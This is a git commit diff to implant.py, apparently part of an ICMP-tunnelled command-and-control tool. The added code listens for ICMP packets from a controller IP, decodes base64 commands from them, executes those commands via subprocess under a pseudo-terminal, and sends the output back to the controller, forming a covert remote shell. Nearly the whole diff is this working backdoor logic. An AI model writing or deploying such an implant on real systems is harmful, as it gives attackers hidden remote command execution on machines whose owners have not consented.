1910f5d1e1ed0010a95ed3ec203889344f802913
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-12 23:06:35 +0000

    a

--- implant.py
+++ implant.py
@@ -5,6 +5,11 @@ import base64
 from shelly import Host
 import shelly
 import ast
+import time
+import subprocess
+from subprocess import PIPE
+from subprocess import STDOUT, check_output, TimeoutExpired
+import pty
 
 ICMP_ID = int(12800)
 TTL = int(64)
@@ -15,16 +20,21 @@ class Implant(Host):
         super().__init__()
         self.type = "implant"
         self.controller_ip = controller_ip
+        self.time_limit = 2
+        self.timer = 0
+        self.time_gap = 0.2
 
     def sniff_callback(self, packet):        
         if packet[IP].src != self.controller_ip:
-            pass
-        elif packet[ICMP].type != 8:
-            pass
+            return
+        elif packet[IP].src == self.ip:
+            return
+        elif packet[ICMP].type != 0:
+            return
         elif packet[ICMP].id != ICMP_ID:
-            pass
+            return
         elif not packet[Raw].load:
-            pass
+            return
 
         encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
         shellpack = base64.b64decode(encoded_shellpack).decode()
@@ -33,6 +43,8 @@ class Implant(Host):
         match unpacked['command']:
             case "join":
                 self.join(unpacked)
+            case "instruction":
+                self.instruction(unpacked)
             case _:
                 print("Default case")
 
@@ -45,6 +57,25 @@ class Implant(Host):
 
         return
 
+    def instruction(self, shellpack):
+        try:
+            if shellpack['message'] != 'request':
+                raise Exception
+            master_fd, slave_fd = pty.openpty()
+            try:
+                cmd = base64.b64decode(shellpack['data'].decode()).decode()
+                cmd = cmd.split(" ")
+                output = check_output(cmd, stdin=slave_fd, stderr=STDOUT, universal_newlines=True, timeout=3)
+                
+                response_shellpack = shelly.build_shellpack(self, "instruction", "response", output)
+                shelly.send(self.controller_ip, response_shellpack)
+            except TimeoutExpired:
+                raise Exception
+
+
+        except Exception:
+            response_shellpack = shelly.build_shellpack(self, "error", "error with instruction") 
+            shelly.send(self.controller_ip, response_shellpack)
 
 def setup_implant() -> Implant:
     print("[ Setting up implant... ]")
